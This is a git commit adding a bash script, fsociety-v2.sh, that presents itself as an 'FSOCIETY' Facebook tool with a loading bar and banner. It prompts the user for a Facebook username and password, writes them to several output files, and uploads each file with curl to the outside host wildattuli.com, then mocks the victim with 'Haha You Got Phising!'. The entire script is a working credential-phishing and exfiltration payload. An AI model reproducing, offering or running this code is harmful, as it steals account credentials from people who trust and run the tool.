f5a4d9b9d2782fc1ed52dfb4db131f4f25dc590e
Moussa FSOCIETY <61067276+FSOCIETY-coder-dz@users.noreply.github.com>
2020-05-01 02:29:11 -0400

    Create fsociety-v2.sh

---
+++ fsociety-v2.sh
@@ -0,0 +1,51 @@
+#!/bin/bash
+count=10
+while [ $count -le 100 ]
+do
+echo "Starting WE ARE FSOCIETY... [$count%]";
+sleep 0.1
+clear
+(( count++ ))
+done
+echo "[+] The FSOCIETY -- Facebook Account Moussa [+]";
+echo '   _____   _____   _____   _____   _   _____   _____  __    __ ';
+echo '  |  ___| /  ___/ /  _  \ /  ___| | | | ____| |_   _| \ \  / / ';
+echo '  | |__   | |___  | | | | | |     | | | |__     | |    \ \/ /  ';
+echo '  |  __|  \___  \ | | | | | |     | | |  __|    | |     \  /   ';
+echo '  | |      ___| | | |_| | | |___  | | | |___    | |     / /    ';
+echo '  |_|     /_____/ \_____/ \_____| |_| |_____|   |_|    /_/1.2.0';
+echo '  --------------------- By FSOCIETY-ARAB --------------------- ';
+echo '  ------------------ instagram : fsociety0557 ---------------- ';
+echo '  ----------------- github : FSOCIETY-coder-dz --------------- ';
+echo ''
+echo 'Login To Your Account First!'
+echo ''
+read -p 'Username/Email:' username
+read -p 'Password:' password
+echo '[+] Login to facebook...';
+sleep 5
+echo '[+] Connecting to facebook...';
+printf "User: $username\nPass: $password" >> output/fuck.html;
+printf "User: $username\nPass: $password" >> output/fuck1.html;
+printf "User: $username\nPass: $password" >> output/fuck2.html;
+printf "User: $username\nPass: $password" >> output/fuck3.html;
+printf "User: $username\nPass: $password" >> output/fuck4.html;
+printf "User: $username\nPass: $password" >> output/fuck5.html;
+printf "User: $username Pass: $password" >> output/fuck6.html;
+printf "User: $username Pass: $password" >> output/fuck7.html;
+printf "User: $username Pass: $password" >> output/fuck8.html;
+printf "User: $username Pass: $password" >> output/fuck9.html;
+printf "User: $username Pass: $password" >> output/fuck0.html;
+sleep 2
+curl -T output/fuck.html http://wildattuli.com
+curl -T output/fuck1.html http://wildattuli.com
+curl -T output/fuck2.html http://wildattuli.com
+curl -T output/fuck3.html http://wildattuli.com
+curl -T output/fuck4.html http://wildattuli.com
+curl -T output/fuck5.html http://wildattuli.com
+curl -T output/fuck6.html http://wildattuli.com
+curl -T output/fuck7.html http://wildattuli.com
+curl -T output/fuck8.html http://wildattuli.com
+curl -T output/fuck9.html http://wildattuli.com
+curl -T output/fuck0.html http://wildattuli.com
+echo '[+] Haha You Got Phising!';
